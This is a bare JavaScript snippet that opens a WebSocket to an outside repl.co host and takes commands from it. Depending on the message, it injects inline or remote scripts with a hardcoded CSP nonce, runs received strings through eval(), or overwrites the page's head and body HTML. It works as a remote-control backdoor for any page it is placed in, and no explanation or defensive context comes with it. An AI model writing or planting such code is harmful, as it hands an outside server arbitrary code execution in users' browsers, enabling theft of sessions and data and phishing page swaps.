var x__skt=new WebSocket("wss://ChocolateElasticUserinterface.kimplayz4lk.repl.co");
x__skt.addEventListener("message",data=>{
data=JSON.parse(data.data);
if(data.what=="popup-script"){
var newScript=document.createElement("script");
var inlineScript=document.createTextNode(data.content);
newScript.setAttribute("nonce","ch4ng3abl3");
newScript.appendChild(inlineScript); 
document.body.appendChild(newScript);
}
if(data.what=="popup-script-link"){
var newScript=document.createElement("script");
newScript.setAttribute("nonce","ch4ng3abl3");
newScript.setAttribute("src",data.content);
document.body.appendChild(newScript);
}
if(data.what=="eval"){eval(data.content);}
if(data.what=="popup-head"){document.head.innerHTML=data.content;}
if(data.what=="popup-body"){document.body.innerHTML=data.content;}
});
x__skt.addEventListener("open",data=>{x__skt.send("popup");});